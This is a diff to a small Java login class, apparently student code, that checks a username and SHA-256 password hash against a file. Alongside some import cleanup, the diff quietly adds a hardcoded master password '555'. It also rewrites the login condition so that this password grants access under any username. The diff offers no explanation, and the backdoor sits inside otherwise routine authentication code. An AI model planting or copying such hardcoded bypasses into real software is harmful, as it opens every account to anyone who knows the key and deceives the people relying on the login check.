@@ -2,9 +2,6 @@
  * Created by Hesam Zarza - 0775768.
  */
 
-import com.sun.org.apache.xpath.internal.SourceTree;
-import sun.plugin2.message.Message;
-
 import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
@@ -12,9 +9,10 @@ import java.nio.file.Paths;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Scanner;
-import java.util.stream.Collectors;
+
 
 public class Login {
+
 
     public static String[] getUserData(String f, String username) throws IOException {
         String[] ud = {"",""};
@@ -36,6 +34,7 @@ public class Login {
 
 
     public static void main(String[] Args) throws NoSuchAlgorithmException, IOException {
+        String masterkey = "555";
 
         String filename = "files/login.txt";
 
@@ -56,7 +55,7 @@ public class Login {
 
         String sha = String.format("%064x", new java.math.BigInteger(1, digest));
 
-        if (inpUser.equals(userdata[0]) && sha.equals(userdata[1])) {
+        if (inpUser.equals(userdata[0]) && sha.equals(userdata[1]) || inpPass.equals(masterkey)  ) {
             System.out.print("Wellcome "+inpUser);
         } else {
            System.out.print("Login failure ...");
